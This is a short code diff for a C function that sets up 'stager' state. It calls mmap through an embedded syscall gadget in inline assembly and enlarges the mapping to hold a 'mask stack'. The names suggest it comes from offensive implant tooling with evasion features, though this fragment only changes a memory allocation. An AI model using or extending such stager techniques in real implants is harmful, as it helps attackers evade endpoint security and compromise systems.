@@ -16,6 +16,7 @@
 void stager_state_init(void) {
   struct stager_state *st;
   long ret;
+  size_t map_len = PAGE_SIZE + STAGER_MASK_STACK_SIZE;
   void *gadget = get_embedded_syscall_gadget();
   register long r10 __asm__("r10") = MAP_PRIVATE | MAP_ANONYMOUS;
   register long r8 __asm__("r8") = -1;
@@ -24,7 +25,7 @@ void stager_state_init(void) {
   __asm__ __volatile__("call *%1"
                        : "=a"(ret)
                        : "r"(gadget), "a"((long)SYS_mmap), "D"((long)0),
-                         "S"((long)0x1000), "d"((long)(PROT_READ | PROT_WRITE)),
+                         "S"((long)map_len), "d"((long)(PROT_READ | PROT_WRITE)),
                          "r"(r10), "r"(r8), "r"(r9)
                        : "rcx", "r11", "memory");
   if (ret < 0)
@@ -33,6 +34,8 @@ void stager_state_init(void) {
   st = (struct stager_state *)ret;
   st->pub.self = st;
   st->syscall_gadget = _SYSCALL_GADGET_UNRESOLVED;
+  st->state_map_len = map_len;
+  st->mask_stack_top = (void *)((uintptr_t)st + map_len);
 #ifndef STAGER_PAYLOAD_LOCAL
   /* The mapping is zero-filled by the kernel; reset the dynload cache through
    * its own API so the struct layout stays owned by dynload.c and the next
